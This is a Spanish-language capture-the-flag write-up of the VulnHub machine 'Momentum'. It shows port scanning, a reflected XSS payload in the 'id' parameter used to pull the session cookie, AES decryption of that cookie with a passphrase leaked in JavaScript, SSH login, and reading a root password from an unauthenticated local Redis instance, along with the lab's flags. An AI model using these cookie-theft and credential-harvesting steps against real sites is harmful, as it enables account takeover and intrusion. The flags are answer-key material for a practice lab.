# Write Up Momentum VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-17 15:02 EDT
Nmap scan report for 192.168.5.191
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5c:8e:2c:cc:c1:b0:3e:7c:0e:22:34:d8:60:31:4e:62 (RSA)
|   256 81:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 (ECDSA)
|_  256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Momentum | Index 
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:C9:EA:BD (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
```

### Puerto 80

Si leemos el codigo vemos un apartado que pone lo siguiente...

```html
<head>
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <script type="text/javascript" src="js/main.js"></script>
    <title>Momentum | Index </title>
</head>
```

Y si nos metemos en ese `js/main.js` vemos lo siguiente...

```js
function viewDetails(str) {

  window.location.href = "opus-details.php?id="+str;
}

/*
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
*/
```

Vemos que hay un `opus-details.php` y con el parametro `id=`, si vamos a la siguiente `URL`...

```
URL = http://<IP>/opus-details.php
```

Vemos que existe el `.php` ahora probaremos alguna inyeccion de `XSS` en el parametro `id=`...

```
URL = http://<IP>/opus-details.php?id=<h1>XSS</h1>
```

Y veremos que ciertamente se ejecuta a parte de que se muestra en la pagina...

Ya que sabemos que es vulnerable al `XSS` haremos lo siguiente...

Robaremos la `Cookie` y por lo que dice el texto que encontramos en `Java` lo desencriptaremos utilizando la contraseña proporcionada...

```
 URL = http://<IP>/opus-details.php?id=<script>alert(document.cookie)</script>
```

> Cookie

```
U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt
```

> Key

```
SecretPassphraseMomentum
```

URL = https://www.browserling.com/tools/aes-decrypt

Lo desencriptamos en esa `URL`, una vez decodificado veremos lo siguiente...

```
auxerre-alienum##
```

Por lo que parece son las credenciales del usuario `auxerre`...

```
User = auxerre
Password = auxerre-alienum##
```

```shell
ssh auxerre@<IP>
```

Una vez estemos dentro leemos la flag...

> user.txt (flag1)

```
[ Momentum - User Owned ]
---------------------------------------
flag : 84157165c30ad34d18945b647ec7f647
---------------------------------------
```

Si hacemos lo siguiente...

```shell
ss -nltp
```

Vemos los procesos con sus puertos y entre ellos esta este proceso trabajando en el `localhost` y si investigamos que es, es un servidor web utilizando `redis`...

```
LISTEN               0                    128                                    127.0.0.1:6379                                   0.0.0.0:*
```

Por lo que haremos lo siguiente para ver las claves que hay...

```shell
redis-cli
```

Info:

```
127.0.0.1:6379> keys *
1) "rootpass"
127.0.0.1:6379> get rootpass
"m0mentum-al1enum##"
127.0.0.1:6379> exit
```

Veremos que hemos descubierto una contraseña la cual va a ser la contraseña de `root`, por lo que...

```shell
su root
```

Y una vez metamos esa `password` seremos `root`, por lo que leeremos la flag...

> root.txt (flag2)

```
[ Momentum - Rooted ]
---------------------------------------
Flag : 658ff660fdac0b079ea78238e5996e40
---------------------------------------
by alienum with <3
```
